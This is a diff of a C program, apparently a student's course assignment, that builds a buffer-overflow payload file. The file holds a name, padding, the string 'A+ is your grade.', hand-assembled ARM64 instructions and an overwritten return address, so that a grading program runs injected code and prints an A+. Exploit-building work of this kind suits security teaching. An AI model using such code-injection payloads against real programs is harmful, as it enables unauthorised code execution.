@@ -8,58 +8,52 @@
 #include <stdlib.h>
 #include "miniassembler.h"
 
-
 int main(void) {
     FILE* psFile;
     unsigned long ret;
-    unsigned int mov;
-    unsigned int adr;
-    unsigned int strb;
+    unsigned int adrFormat;
     unsigned int b;
-    unsigned int adrString;
     int i;
     char* name;
     char* formatString;
     
-    name = "Sarika ";
+    name = "Sarika Ahire";
     formatString = "A+ is your grade.\n";
+    /* return address */
+    ret = 0x42007C;
 
-    /* printf */
-    ret = 4196440lu;
+    /* 0x420068 = address of adrFormat in bss: name[] + 16
+       0x42007C = address of instruction in bss = (start of name[]) + 20 */
+    adrFormat = MiniAssembler_adr(1, 0x420068, 0x42007C);
 
+    /* 0x400874 = address of printf(grade) 
+       0x420080 = address of instruction in bss = (start of name[]) + 28 */
+    b = MiniAssembler_b(0x400874, 0x420080);
 
-    /* 0x420060 = address of formatstring in data
-       0x420074 = address of instruction in bss = (start of name[]) + 28 */
-    adrString = MiniAssembler_adr(0,0x420061,0x420074);
+    psFile = fopen("dataA", "w");
     
-    /* 0x40086c = address of printf(grade) 
-       0x420078 = address of instruction in bss = (start of name[]) + 32 */
-    b = MiniAssembler_b(0x40086c, 0x420078);
-
-    psFile = fopen("dataAplus", "w");
-    
-    /* name from 0-6 */
+    /* name from 0-11 */
     fprintf(psFile, "%s", name);
-
-    /* null byte for name 7 */
-    fprintf(psFile, "%c", '\0');
-
-    /* printf format string 8-25*/
-    fprintf(psFile, "%s", formatString);
-
-    /* null byte for format string 26-27*/
-    fprintf(psFile, "%c", '\0');
-    fprintf(psFile, "%c", '\0');
-
-    /* adrp x0, adr 28-31*/
-    fwrite(&adrString, sizeof(unsigned int), 1, psFile);
-    /* b printf from 32-35 */
-    fwrite(&b, sizeof(unsigned int), 1, psFile);
-
-    /* padding from 35-47 */
-    for (i = 0; i < 12; i++)
+    /* padding from 12-15 */
+    for (i = 0; i < 4; i++)
         fprintf(psFile, "%c", '\0');
 
+    /* formatString from 16-33*/
+    fprintf(psFile, "%s", formatString);
+
+    /* padding from 34-35*/
+    for (i=0; i < 2; i++)
+        fprintf(psFile, "%c", '\0');
+
+    /* adr x0,  from 36-39 */
+    fwrite(&adrFormat, sizeof(unsigned int), 1, psFile);
+    /* b printf from 40-43 */
+    fwrite(&b, sizeof(unsigned int), 1, psFile);
+
+    /* padding from 44-47 */
+    for (i = 0; i < 4; i++)
+        fprintf(psFile, "%c", '\0');
+    
     fwrite(&ret, sizeof(unsigned long), 1, psFile);
     return 0;
 }
